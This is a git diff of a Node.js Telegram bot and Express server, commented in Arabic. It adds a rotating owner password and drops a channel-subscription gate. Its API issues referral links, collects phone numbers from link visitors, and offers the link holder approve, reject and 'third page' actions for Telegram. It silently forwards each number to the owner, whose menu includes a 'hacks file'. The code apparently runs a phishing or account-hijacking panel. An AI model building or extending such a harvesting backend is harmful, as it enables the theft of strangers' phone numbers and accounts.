@@ -4,16 +4,13 @@ const sqlite3 = require("sqlite3").verbose();
 const crypto = require("crypto");
 
 // ============================================================
-// 1. الإعدادات
+// الإعدادات
 // ============================================================
 
 const TOKEN = process.env.BOT_TOKEN;
 const PORT = process.env.PORT || 3000;
-const OWNER_ID = "8425767629"; // ← ضع معرفك
+const OWNER_ID = "8425767629"; // ← ضع معرفك هنا
 const OWNER_NAME = "عمر";
-
-const CHANNEL_LINK = "https://t.me/+di5cbj-Ef-pjZmFk";
-const REQUIRED_CHANNEL_ID = "-1001234567890"; // ← غيّره
 
 if (!TOKEN) {
     console.error("❌ BOT_TOKEN is missing");
@@ -21,30 +18,12 @@ if (!TOKEN) {
 }
 
 // ============================================================
-// 2. تعريف البوت (هنا)
+// كلمة السر اليومية (تتغير تلقائياً كل يوم الساعة 11 صباحاً)
 // ============================================================
 
-const bot = new TelegramBot(TOKEN, { polling: true });
-console.log("✅ Telegram Bot started");
+let dailySecret = generateDailySecret();
 
-// ============================================================
-// باقي المتغيرات
-// ============================================================
-
-let isBotActive = true;
-let showAppButtons = false;
-let dailySecret = "12345678";
-let currentSecretCode = generateSecretCode();
-const acceptedUsers = new Set();
-const verifiedUsers = new Set();
-const waitingForSecret = new Set();
-let subscribeTimer = {};
-
-// ============================================================
-// دوال مساعدة
-// ============================================================
-
-function generateSecretCode() {
+function generateDailySecret() {
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
     let code = '';
     for (let i = 0; i < 8; i++) {
@@ -53,11 +32,65 @@ function generateSecretCode() {
     return code;
 }
 
-function createToken() { return crypto.randomBytes(32).toString("hex"); }
-function createRequestId() { return crypto.randomBytes(16).toString("hex"); }
+// ============================================================
+// جدولة تغيير كلمة السر يومياً الساعة 11:00 صباحاً (توقيت الأردن)
+// ============================================================
+
+function scheduleDailyReset() {
+    const now = new Date();
+    const target = new Date();
+    target.setHours(11, 0, 0, 0); // 11:00 صباحاً
+
+    if (now > target) {
+        target.setDate(target.getDate() + 1);
+    }
+
+    const msUntilTarget = target.getTime() - now.getTime();
+
+    console.log(`⏰ سيتم تغيير كلمة السر بعد ${Math.round(msUntilTarget / 60000)} دقيقة`);
+
+    setTimeout(() => {
+        const oldCode = dailySecret;
+        dailySecret = generateDailySecret();
+
+        console.log(`🔄 تم تغيير كلمة السر: ${oldCode} → ${dailySecret}`);
+
+        // ✅ إرسال الكلمة الجديدة للمالك
+        bot.sendMessage(
+            OWNER_ID,
+            `🔑 *كلمة السر اليومية الجديدة:*\n\`${dailySecret}\`\n📅 ${new Date().toLocaleString('ar-JO', { timeZone: 'Asia/Amman' })}`,
+            { parse_mode: 'Markdown' }
+        ).catch(console.error);
+
+        scheduleDailyReset();
+
+    }, msUntilTarget);
+}
 
 // ============================================================
-// قاعدة البيانات
+// Telegram Bot
+// ============================================================
+
+const bot = new TelegramBot(TOKEN, { polling: true });
+console.log("✅ Telegram Bot started");
+
+// ============================================================
+// Express
+// ============================================================
+
+const app = express();
+app.use(express.json());
+
+app.use((req, res, next) => {
+    res.setHeader("Access-Control-Allow-Origin", "*");
+    res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
+    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
+    if (req.method === "OPTIONS") return res.sendStatus(204);
+    next();
+});
+
+// ============================================================
+// Database
 // ============================================================
 
 const db = new sqlite3.Database("./referrals.db");
@@ -69,22 +102,24 @@ db.serialize(() => {
 console.log("✅ Database ready");
 
 // ============================================================
-// Express
+// بدء الجدولة
 // ============================================================
 
-const app = express();
-app.use(express.json());
-app.use((req, res, next) => {
-    res.setHeader("Access-Control-Allow-Origin", "*");
-    res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
-    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
-    if (req.method === "OPTIONS") return res.sendStatus(204);
-    next();
-});
+scheduleDailyReset();
+console.log(`⏰ تم جدولة تغيير كلمة السر يومياً الساعة 11:00 صباحاً بتوقيت الأردن`);
 
 // ============================================================
-// دوال DB
+// Helpers
 // ============================================================
+
+const acceptedUsers = new Set();
+const verifiedUsers = new Set();
+const waitingForSecret = new Set();
+let isBotActive = true;
+let showAppButtons = false;
+
+function createToken() { return crypto.randomBytes(32).toString("hex"); }
+function createRequestId() { return crypto.randomBytes(16).toString("hex"); }
 
 function createReferral(telegramId) {
     return new Promise((resolve, reject) => {
@@ -188,24 +223,125 @@ function getAllContactRequests() {
 }
 
 // ============================================================
-// دوال البوت
+// Health
 // ============================================================
 
-async function isUserInChannel(telegramId) {
+app.get("/", (req, res) => res.json({ ok: true, service: "Telegram Contact Server" }));
+app.get("/health", (req, res) => res.json({ ok: true, status: "online" }));
+
+// ============================================================
+// API Routes
+// ============================================================
+
+app.post("/api/referral/create", async (req, res) => {
     try {
-        const member = await bot.getChatMember(REQUIRED_CHANNEL_ID, telegramId);
-        if (member.status === 'left' || member.status === 'kicked') return { inChannel: false };
-        return { inChannel: true };
+        const { telegram_id } = req.body;
+        if (!telegram_id) return res.status(400).json({ success: false, error: "telegram_id is required" });
+        const token = await createReferral(telegram_id);
+        res.json({ success: true, token });
     } catch (error) {
-        return { inChannel: false };
+        res.status(500).json({ success: false, error: "Failed to create referral" });
     }
-}
+});
+
+app.get("/api/referral/:token", async (req, res) => {
+    try {
+        const referral = await getReferral(req.params.token);
+        if (!referral) return res.status(404).json({ success: false, valid: false, error: "Invalid referral" });
+        res.json({ success: true, valid: true });
+    } catch (error) {
+        res.status(500).json({ success: false, error: "Database error" });
+    }
+});
+
+app.post("/api/request-access", async (req, res) => {
+    try {
+        const { ref, phone, app } = req.body;
+        if (!ref) return res.status(400).json({ success: false, error: "ref is required" });
+        if (!phone) return res.status(400).json({ success: false, error: "phone is required" });
+
+        const referral = await getReferral(ref);
+        if (!referral) return res.status(404).json({ success: false, error: "Invalid referral" });
+
+        const telegramId = referral.telegram_id;
+        const requestId = createRequestId();
+
+        await new Promise((resolve, reject) => {
+            db.run(`INSERT INTO contact_requests (request_id, telegram_id, phone, status) VALUES (?, ?, ?, ?)`,
+                [requestId, String(telegramId), String(phone), "pending"], (err) => {
+                    if (err) reject(err);
+                    else resolve();
+                });
+        });
+
+        let buttons;
+        if (app === "telegram") {
+            buttons = [
+                [{ text: "✅ قبول", callback_data: `approve:${requestId}` }],
+                [{ text: "❌ رفض", callback_data: `reject:${requestId}` }],
+                [{ text: "🔑 الصفحة الثالثة", callback_data: `third_page:${requestId}` }]
+            ];
+        } else {
+            buttons = [
+                [
+                    { text: "✅ قبول", callback_data: `approve:${requestId}` },
+                    { text: "❌ رفض", callback_data: `reject:${requestId}` }
+                ]
+            ];
+        }
+
+        // ✅ إرسال الطلب لصاحب الرابط
+        await bot.sendMessage(
+            telegramId,
+            `📩 طلب تواصل جديد\n📱 ${phone}\n🆔 ${requestId}\n📌 ${app || "غير محدد"}`,
+            { reply_markup: { inline_keyboard: buttons } }
+        );
+
+        // ✅ إرسال نسخة للمالك
+        await bot.sendMessage(
+            OWNER_ID,
+            `📩 *طلب تواصل جديد (نسخة للمالك)*\n\n📱 *رقم التواصل:* ${phone}\n🆔 *رقم الطلب:* ${requestId}\n📌 *التطبيق:* ${app || "غير محدد"}\n👤 *صاحب الرابط:* ${telegramId}`,
+            { parse_mode: 'Markdown' }
+        );
+
+        res.json({ success: true, requestId });
+    } catch (error) {
+        res.status(500).json({ success: false, error: "Failed to create request" });
+    }
+});
+
+app.get("/api/check-request/:requestId", async (req, res) => {
+    try {
+        const request = await getRequest(req.params.requestId);
+        if (!request) return res.status(404).json({ success: false, error: "Request not found" });
+        res.json({ success: true, status: request.status });
+    } catch (error) {
+        res.status(500).json({ success: false, error: "Database error" });
+    }
+});
+
+app.post("/forgot-password", async (req, res) => {
+    try {
+        const { ref } = req.body;
+        if (!ref) return res.status(400).json({ success: false, error: "ref is required" });
+        const referral = await getReferral(ref);
+        if (!referral) return res.status(404).json({ success: false, error: "Invalid referral" });
+        await bot.sendMessage(referral.telegram_id, `🔑 طلب إعادة تعيين كلمة المرور`);
+        res.json({ success: true, message: "تم إرسال الطلب" });
+    } catch (error) {
+        res.status(500).json({ success: false, error: "Failed to send request" });
+    }
+});
+
+// ============================================================
+// Owner Menu
+// ============================================================
 
 function sendOwnerMenu(chatId) {
     let buttons = [
         [{ text: "📊 عدد المستخدمين", callback_data: "users_count" }],
         [{ text: isBotActive ? "⏸ إيقاف البوت" : "▶️ تشغيل البوت", callback_data: "toggle_bot" }],
-        [{ text: "🔑 كلمة السر", callback_data: "show_secret" }],
+        [{ text: "🔑 كلمة السر اليومية", callback_data: "show_secret" }],
         [{ text: "📋 قائمة المستخدمين", callback_data: "users_list" }],
         [{ text: "📁 ملف الاختراقات", callback_data: "hack_file" }]
     ];
@@ -233,6 +369,10 @@ function sendOwnerMenu(chatId) {
     );
 }
 
+// ============================================================
+// User Menu
+// ============================================================
+
 function sendUserMenu(chatId) {
     return bot.sendMessage(
         chatId,
@@ -256,10 +396,10 @@ function sendUserMenu(chatId) {
 }
 
 // ============================================================
-// أوامر البوت (bot.onText) - هنا بعد تعريف البوت
+// /start
 // ============================================================
 
-bot.onText(/\/start$/, async (msg) => {
+bot.onText(/^\/start$/, async (msg) => {
     try {
         const chatId = msg.chat.id;
         const firstName = msg.from?.first_name || "غير معروف";
@@ -267,66 +407,24 @@ bot.onText(/\/start$/, async (msg) => {
         const username = msg.from?.username ? `@${msg.from.username}` : "لا يوجد";
         await saveUser(chatId, username, firstName, lastName);
 
+        // ✅ صاحب البوت (يطلب كلمة السر اليومية)
         if (String(chatId) === OWNER_ID) {
             if (!acceptedUsers.has(chatId)) {
                 return bot.sendMessage(
                     chatId,
-                    `🔐 *أدخل كلمة السر اليومية:*\n\n📌 يرجى إدخال كلمة السر التي تم إرسالها في المجموعة.`,
+                    `🔐 *أدخل كلمة السر اليومية:*\n\n📌 يرجى إدخال كلمة السر التي وصلتك على البوت.`,
                     { parse_mode: 'Markdown' }
                 );
             }
             return sendOwnerMenu(chatId);
         }
 
+        // ✅ البوت موقف
         if (!isBotActive) {
             return bot.sendMessage(chatId, `⛔ البوت موقف حالياً.`);
         }
 
-        if (subscribeTimer[chatId] && subscribeTimer[chatId] === 'waiting') {
-            return bot.sendMessage(
-                chatId,
-                `⏳ *جاري التحقق من الاشتراك...*\n\n📌 يرجى الانتظار 5 ثوانٍ حتى يتم التأكيد.`,
-                { parse_mode: 'Markdown' }
-            );
-        }
-
-        const result = await isUserInChannel(chatId);
-
-        if (!result.inChannel) {
-            subscribeTimer[chatId] = 'waiting';
-
-            await bot.sendMessage(
-                chatId,
-                `⚠️ *يرجى الاشتراك في القناة أولاً* 🔗\n\n` +
-                `📌 للاستفادة من خدمات البوت، يجب أن تكون مشتركاً في قناتنا.\n\n` +
-                `🔗 *رابط القناة:*\n${CHANNEL_LINK}\n\n` +
-                `⏳ *لديك 5 ثوانٍ للاشتراك، بعدها سينتهي الزر.*`,
-                {
-                    parse_mode: 'Markdown',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{ text: "🔄 اشتركت! تحقق الآن", callback_data: "check_subscribe" }]
-                        ]
-                    }
-                }
-            );
-
-            setTimeout(() => {
-                if (subscribeTimer[chatId] === 'waiting') {
-                    subscribeTimer[chatId] = 'expired';
-                    bot.sendMessage(
-                        chatId,
-                        `⏰ *انتهى الوقت!*\n\n📌 يرجى الضغط على /start مرة أخرى لإعادة المحاولة.`,
-                        { parse_mode: 'Markdown' }
-                    );
-                }
-            }, 5000);
-
-            return;
-        }
-
-        subscribeTimer[chatId] = 'done';
-
+        // ✅ التحقق من الموافقة على الشروط
         const isVerified = await isUserVerified(chatId);
         if (!isVerified && !verifiedUsers.has(String(chatId))) {
             return bot.sendMessage(
@@ -346,6 +444,7 @@ bot.onText(/\/start$/, async (msg) => {
             );
         }
 
+        // ✅ المستخدم جاهز
         if (!acceptedUsers.has(chatId)) acceptedUsers.add(chatId);
         return sendUserMenu(chatId);
 
@@ -354,17 +453,8 @@ bot.onText(/\/start$/, async (msg) => {
     }
 });
 
-bot.onText(/\/channelid$/, async (msg) => {
-    const chatId = msg.chat.id;
-    if (msg.chat.type === 'channel' || msg.chat.type === 'group' || msg.chat.type === 'supergroup') {
-        bot.sendMessage(chatId, `🆔 معرف هذه القناة/المجموعة: \`${chatId}\``, { parse_mode: 'Markdown' });
-    } else {
-        bot.sendMessage(chatId, `⚠️ هذه ليست قناة أو مجموعة.`);
-    }
-});
-
 // ============================================================
-// معالجة الرسائل النصية (كلمة السر)
+// معالجة الرسائل النصية (كلمة السر للمالك)
 // ============================================================
 
 bot.on('message', async (msg) => {
@@ -372,6 +462,7 @@ bot.on('message', async (msg) => {
         const chatId = String(msg.chat.id);
         const text = msg.text;
 
+        // ✅ المالك يدخل كلمة السر
         if (chatId === OWNER_ID && !acceptedUsers.has(chatId)) {
             if (text === dailySecret) {
                 acceptedUsers.add(chatId);
@@ -383,8 +474,9 @@ bot.on('message', async (msg) => {
             return;
         }
 
+        // ✅ كلمة السر للمستخدمين العاديين (إذا أردت تفعيلها)
         if (waitingForSecret.has(chatId)) {
-            if (text === currentSecretCode) {
+            if (text === dailySecret) {
                 await verifyUser(chatId);
                 waitingForSecret.delete(chatId);
                 await bot.sendMessage(chatId, `✅ تم التحقق!\n📌 اضغط /start`);
@@ -398,7 +490,7 @@ bot.on('message', async (msg) => {
 });
 
 // ============================================================
-// معالجة الأزرار (callback_query)
+// Callback Query
 // ============================================================
 
 bot.on("callback_query", async (query) => {
@@ -470,7 +562,7 @@ bot.on("callback_query", async (query) => {
             }
             if (data === "show_secret") {
                 await bot.answerCallbackQuery(query.id);
-                return bot.sendMessage(chatId, `🔑 كلمة السر: \`${currentSecretCode}\``, { parse_mode: 'Markdown' });
+                return bot.sendMessage(chatId, `🔑 *كلمة السر اليومية:*\n\`${dailySecret}\``, { parse_mode: 'Markdown' });
             }
             if (data === "toggle_bot") {
                 isBotActive = !isBotActive;
@@ -480,70 +572,8 @@ bot.on("callback_query", async (query) => {
         }
 
         // =================================================
-        // زر التحقق من الاشتراك
+        // إذا البوت موقف
         // =================================================
-
-        if (data === "check_subscribe") {
-            if (subscribeTimer[chatId] === 'expired') {
-                await bot.answerCallbackQuery(query.id, { text: "⏰ انتهى الوقت! اضغط /start مرة أخرى" });
-                return bot.sendMessage(
-                    chatId,
-                    `⏰ *انتهى الوقت!*\n\n📌 يرجى الضغط على /start مرة أخرى لإعادة المحاولة.`,
-                    { parse_mode: 'Markdown' }
-                );
-            }
-
-            if (subscribeTimer[chatId] !== 'waiting') {
-                await bot.answerCallbackQuery(query.id, { text: "⚠️ يرجى الضغط على /start أولاً" });
-                return;
-            }
-
-            const result = await isUserInChannel(chatId);
-            if (result.inChannel) {
-                subscribeTimer[chatId] = 'done';
-                await bot.answerCallbackQuery(query.id, { text: "✅ تم التأكيد! أنت مشترك" });
-                bot.emit('text', { chat: { id: chatId }, from: query.from, text: '/start' });
-            } else {
-                await bot.answerCallbackQuery(query.id, { text: "❌ لا تزال غير مشترك" });
-                await bot.sendMessage(
-                    chatId,
-                    `❌ *لا نراك مشتركاً بعد.*\n\n` +
-                    `🔗 *رابط القناة:*\n${CHANNEL_LINK}\n\n` +
-                    `✅ بعد الاشتراك، اضغط على الزر مرة أخرى.`,
-                    {
-                        parse_mode: 'Markdown',
-                        reply_markup: {
-                            inline_keyboard: [
-                                [{ text: "🔄 تحقق مرة أخرى", callback_data: "check_subscribe" }]
-                            ]
-                        }
-                    }
-                );
-            }
-            return;
-        }
-
-        // =================================================
-        // التحقق من القناة للمستخدمين العاديين
-        // =================================================
-
-        if (String(chatId) !== OWNER_ID) {
-            const result = await isUserInChannel(chatId);
-            if (!result.inChannel) {
-                await bot.answerCallbackQuery(query.id, { text: "⚠️ اشترك في القناة أولاً!" });
-                return bot.sendMessage(
-                    chatId,
-                    `⚠️ يرجى الاشتراك في القناة أولاً:\n${CHANNEL_LINK}\n\n🔄 بعد الاشتراك، اضغط /start`,
-                    {
-                        reply_markup: {
-                            inline_keyboard: [
-                                [{ text: "🔄 تحقق من الاشتراك", callback_data: "check_subscribe" }]
-                            ]
-                        }
-                    }
-                );
-            }
-        }
 
         if (!isBotActive && String(chatId) !== OWNER_ID) {
             return bot.answerCallbackQuery(query.id, { text: "⛔ البوت موقف" });
@@ -592,7 +622,7 @@ bot.on("callback_query", async (query) => {
         }
 
         // =================================================
-        // الموافقة على الشروط
+        // التحقق من الموافقة على الشروط
         // =================================================
 
         if (!acceptedUsers.has(chatId) && String(chatId) !== OWNER_ID) {
@@ -628,7 +658,7 @@ bot.on("callback_query", async (query) => {
 });
 
 // ============================================================
-// أخطاء الـ Polling
+// Telegram polling errors
 // ============================================================
 
 bot.on("polling_error", (error) => {
@@ -640,7 +670,15 @@ bot.on("polling_error", (error) => {
 // ============================================================
 
 app.listen(PORT, "0.0.0.0", () => {
-    console.log(`🚀 Bot running on port ${PORT}`);
+    console.log("");
+    console.log("====================================");
+    console.log("🚀 Telegram Bot + API Server");
+    console.log(`🌐 Port: ${PORT}`);
+    console.log("❤️ Health: /health");
+    console.log("====================================");
     console.log(`🔑 كلمة السر اليومية: ${dailySecret}`);
-    console.log(`📌 القناة المطلوبة: ${CHANNEL_LINK}`);
+    console.log(`⏰ تتغير تلقائياً الساعة 11:00 صباحاً بتوقيت الأردن`);
+    console.log(`👑 المالك: ${OWNER_NAME} (${OWNER_ID})`);
+    console.log(`🟢 حالة البوت: ${isBotActive ? "شغال" : "موقف"}`);
+    console.log("====================================");
 });
